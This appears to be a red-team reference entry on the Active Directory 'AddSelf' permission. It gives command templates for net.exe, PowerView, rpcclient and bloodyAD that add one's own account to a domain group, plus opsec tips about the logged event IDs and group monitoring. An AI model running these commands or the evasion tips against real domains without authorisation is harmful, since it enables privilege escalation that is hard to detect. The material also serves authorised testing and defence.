name: AddSelf
description: Permission to add yourself to a group (Self-Membership / WriteMember on self)
commands:
- '# AddSelf allows adding yourself to the target group'
- ''
- '# Using net.exe (Windows)'
- net group "<GROUP_NAME>" <YOUR_USER> /add /domain
- ''
- '# Using PowerView'
- Add-DomainGroupMember -Identity "<GROUP_NAME>" -Members "<YOUR_USER>"
- ''
- '# Using rpcclient (Linux)'
- rpcclient -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' <DC_IP> -c 'addgroupmem "<GROUP_NAME>" <YOUR_USER>'
- ''
- '# Using bloodyAD'
- bloodyAD -d '<DOMAIN>' -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' --host <DC_IP> add groupMember '<GROUP_NAME>' '<YOUR_USER>'
- ''
- '# Verify membership'
- net user <YOUR_USER> /domain
opsec:
- Group membership changes are logged (Event ID 4728, 4732, 4756)
- Consider timing and whether the group is monitored
references:
- https://bloodhound.specterops.io/resources/edges/add-self
